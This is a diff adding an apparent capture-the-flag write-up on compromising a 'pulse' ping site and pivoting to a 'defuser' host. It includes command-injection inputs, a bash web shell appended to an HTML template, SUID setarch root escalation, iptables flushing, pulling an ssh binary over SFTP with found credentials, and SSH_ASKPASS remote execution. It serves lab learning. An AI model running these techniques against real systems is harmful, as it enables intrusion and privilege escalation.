@@ -101,3 +101,113 @@ for (( i=1; i<=5000; i++ )); do
     OCTAL=$(printf '%03o' $LOW)
     CHAR=$(printf "\\$OCTAL")
 ```
+
+Script output:
+```
+[*] Starting binary search extraction for: pwd
+[+] Extracted Base64: L29wdC9jb250cm9sbGVyLXB1bHNlL2FwcAo=
+[*] End of output reached.
+
+[*] Decoding...
+
+/opt/controller-pulse/app
+```
+
+## Web Shell
+
+Using the script, I found my current working directory, and found that the file hosting the 'ping' website was located at /opt/controller-pulse/app/templates/development.html. Back on the website, I ran `; [ -w /opt/controller-pulse/app/templates/development.html ]` and it came back with "Host Up" which means the command executed successfully and I can write to the file. Using this I could start using the page as a webshell by appending the output of bash commands to the bottom of the HTML file. I wrote this simple webshell in bash, used base64 to upload it through the ping box, and called it /tmp/b on the target. 
+
+```
+#!/bin/bash
+
+COMMAND=$*
+HTMLFILE="/opt/controller-pulse/app/templates/development.html"
+OUTPUT="[$(date)] WEBSHELL OUTPUT for '$COMMAND': $(/bin/bash -c $COMMAND) | base64 -w0)"
+echo "$OUTPUT" >> "$HTMLFILE"
+```
+
+The script takes the output of a command, pipes it to base64 with some header information, and appends it to the end of the file. I could now run commands in the ping box like `;/tmp/b id`, refresh the page, and see the output at the bottom. I then just took the base64 output and decoded it on my local machine.
+
+```
+[Sun Mar 15 06:33:29 AM UTC 2026] WEBSHELL OUTPUT for 'id': dWlkPTk5NyhwdWxzZSkgZ2lkPTk5NihwdWxzZSkgZ3JvdXBzPTk5NihwdWxzZSkK
+$ echo dWlkPTk5NyhwdWxzZSkgZ2lkPTk5NihwdWxzZSkgZ3JvdXBzPTk5NihwdWxzZSkK | base64 -d
+uid=997(pulse) gid=996(pulse) groups=996(pulse)
+```
+
+I used this web shell to run some additional commands on the 'pulse' target. One command I ran was the standard find command to find SUID binaries. I found that `/usr/bin/setarch` had the SUID bit set, which is listed on the GTFObins webpage. I modified the web shell to run commands through setach, also using python's `os` library to ensure the UID and GUID of the processes I am running are root, not just the EUID and GUID.
+
+```
+#!/bin/bash
+
+COMMAND=$*
+HTMLFILE="/opt/controller-pulse/app/templates/development.html"
+OUTPUT="[$(date)] WEBSHELL OUTPUT for '$COMMAND': $(/bin/bash -c "/usr/bin/setarch x86_64 python3 -c 'import os; os.setuid(0); os.setgid(0); os.system(\"$COMMAND\")'" | base64 -w0)"
+echo "$OUTPUT" >> "$HTMLFILE"
+```
+
+```
+Sun Mar 15 06:40:15 AM UTC 2026] WEBSHELL OUTPUT for 'id': dWlkPTAocm9vdCkgZ2lkPTAocm9vdCkgZ3JvdXBzPTAocm9vdCksOTk2KHB1bHNlKQo=
+$ echo dWlkPTAocm9vdCkgZ2lkPTAocm9vdCkgZ3JvdXBzPTAocm9vdCksOTk2KHB1bHNlKQo= | base64 -d                                                 
+uid=0(root) gid=0(root) groups=0(root),996(pulse)
+```
+
+## Lateral Movement to Defuse Server
+
+As part of my enumeration on the "pulse" server, I found that the defuser server was listed in `/etc/hosts` as 10.60.20.74. I also found a note in a file called `/lazyadmin.txt` that said the following: 
+
+> That lazy admin is always messing with binaries permissions,
+> I swear here will be the reason for a major incident.
+> Just this week he told me he has been logging into defuser with credentials admin:admin
+
+Cool, so now I have the credentials and the IP address of the defuser host, I just need a way to login. My first thought was to ssh in, however, there was no SSH binary on the pulse target. It appears that it was deliberately removed. Additionally, there was a firewall rule blocking outbound ssh to defuser, but this was easy to get around now that I was root and could run `iptables -F`. 
+
+I learned that curl can act as an SFTP client, and since the defuser had ssh open I could try connecting to it to enumerate and transfer files. Unfortunately, this would not help me get code execution on the remote machine as my credentials were for an unprivileged user that likely couldn't write to crontab, etc. directly. Eventually, I thought, why not just try to transfer the SFTP binary from the defuser to the pulse server.
+
+```
+; curl -k -o /tmp/ssh -u admin:admin sftp://10.60.20.74/usr/bin/ssh; chmod +x /tmp/ssh
+```
+
+So now I had an SSH binary on the pulse server and the firewall rules were clear, but I was still operating through the web shell which was prohibit me from getting an interactive shell on the defuser server.
+
+I found out it is possible to bypass the need for a TTY to enter a password in SSH by setting the SSH_ASKPASS environment variable to the location of a script that prints the password. I created a script in /tmp/ap.sh on pulse that simply ran `echo admin`, and then was able to run commands on defuser through my web shell on pulse using the following format.
+
+```
+; env SSH_ASKPASS=/tmp/ap.sh DISPLAY=dummy:0 setsid /tmp/ssh -q -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null admin@10.60.20.74 "id" > /tmp/aa 2>/tmp/ee; /tmp/c cat /tmp/aa /tmp/ee
+[Sun Mar 15 06:54:57 AM UTC 2026] WEBSHELL OUTPUT for 'cat /tmp/aa /tmp/ee': dWlkPTEwMDAoYWRtaW4pIGdpZD0xMDAwKGFkbWluKSBncm91cHM9MTAwMChhZG1pbikK
+$ echo dWlkPTEwMDAoYWRtaW4pIGdpZD0xMDAwKGFkbWluKSBncm91cHM9MTAwMChhZG1pbikK | base64 -d
+uid=1000(admin) gid=1000(admin) groups=1000(admin)
+```
+
+## Defusing the Bomb
+Now that I had the ability to execute commands on the defuser host, all that was left was to figure out how to access the defuser website to defuse the bomb. I found the following lines in the admin's bash history:
+```
+sudo iptables -A INPUT -i lo -s 127.0.0.1 -p tcp --sport 46900 --dport 80 -j ACCEPT
+sudo iptables -A OUTPUT -o lo -d 127.0.0.1 -p tcp --sport 46900 --dport 80 -j ACCEPT
+sudo iptables -A INPUT -i lo -d 127.0.0.1 -p tcp --dport 80 -j REJECT --reject-with tcp-reset
+sudo iptables -A OUTPUT -o lo -d 127.0.0.1 -p tcp --dport 80 -j REJECT --reject-with tcp-reset
+```
+
+This tells me that they were only accepting connections to the webserver from localhost on a specific source port. After reading through the source code and finding a few additional checks that the website was doing in order to allow the defuser code to go through, I had AI help me write this python script in order to defuse the bomb.
+
+```
+import http.client as hc, json, hashlib as hl, urllib.parse as up, sys
+c = hc.HTTPConnection("127.0.0.1", 80, source_address=("127.0.0.1", 46900))
+u, o = "x", "http://127.0.0.1"
+c.request("GET", "/", headers={"User-Agent": u})
+n = c.getresponse().read().decode().split('"nonce": "')[1].split('"')[0]
+p = hl.sha256(f"{n}::{u}::{o}::::".encode()).hexdigest()
+c.request("POST", "/api/browser-session", body=json.dumps({"nonce":n,"proof":p,"origin":o,"screen":"","language":""}), headers={"User-Agent":u, "Content-Type":"application/json"})
+k = c.getresponse().getheader("Set-Cookie").split(";")[0]
+c.request("POST", "/submit", body=up.urlencode({"code": sys.argv[1]}), headers={"User-Agent":u, "Content-Type":"application/x-www-form-urlencoded", "Cookie":k})
+print(c.getresponse().read().decode())
+```
+
+I base64 encoded it, uploaded it in chunks, and executed it. Unfortunately, I was too late to defuse the bomb, but I still had fun trying.
+
+```
+<div class="notice"><span class="bad">Failed:</span> <code>409</code> <code>{"detail":"Cannot defuse: EXPIRED"}</code></div>
+```
+
+
+
+
